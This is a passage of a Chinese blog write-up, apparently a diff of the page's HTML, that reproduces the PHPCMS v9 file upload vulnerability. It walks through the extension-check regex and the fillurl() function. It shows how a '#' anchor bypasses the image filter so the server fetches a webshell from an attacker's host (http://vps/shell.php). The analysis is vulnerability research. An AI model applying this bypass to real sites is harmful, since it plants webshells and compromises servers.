+<p>跟进new_stripslashes()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回经stripslashes处理过的字符串或数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $string 需要处理的字符串或数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new_stripslashes</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!is_array($string)) <span class="keyword">return</span> stripslashes($string);</span><br><span class="line">	<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) $string[$key] = new_stripslashes($val);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/19/phpcmsv9文件上传漏洞-复现/2.png" alt=""></p>
+<p>接着看到153行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches))  <span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure></p>
+<p>这个正则表达式可以理解为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(href|src)=([\<span class="string">"|']?)([^\"'&gt;]+\.(gif|jpg|jpeg|bmp|png))\2</span></span><br></pre></td></tr></table></figure></p>
+<p>这里检测后缀名为gif|jpg|jpeg|bmp|png的文件，但是由于过滤不够严格，所以还是可以绕过，demo一下<br><img src="/2019/07/19/phpcmsv9文件上传漏洞-复现/4.png" alt=""></p>
+<p>在神盾杯的那道题中，之所以可以使用锚点，就是因为在url请求中’#’以后的数据，在请求中是不带的<br><img src="/2019/07/19/phpcmsv9文件上传漏洞-复现/5.png" alt=""></p>
+<p>而在这里，我们会看到过滤后的数据会进入fillurl()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">			dir_create($uploaddir);</span><br><span class="line">			$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">		&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>跟进函数fillurl()::300行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>截取’#’之前的内容，所以绕过过滤后，将会通过<a href="http://vps/shell.php得到文件内容" target="_blank" rel="noopener">http://vps/shell.php得到文件内容</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是那句话，善于使用debug,动态调试，然后在一些小的地方，可以通过var_dump()，print_r()，这种函数，进行手动debug,代码的分析能力还需提高。<br>要加深对数据库的学习。多学吧，送给自己一句话：现在浪费的时间，都是给未来的自己挖坑。</p>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#写在前面"><span class="toc-number">1.1.</span> <span class="toc-text">写在前面</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#触发点追溯"><span class="toc-number">3.1.</span> <span class="toc-text">触发点追溯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#考虑过滤"><span class="toc-number">3.2.</span> <span class="toc-text">考虑过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/";
+  var disqus_url = "http://yoursite.com/2019/07/19/phpcmsv9文件上传漏洞-复现/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
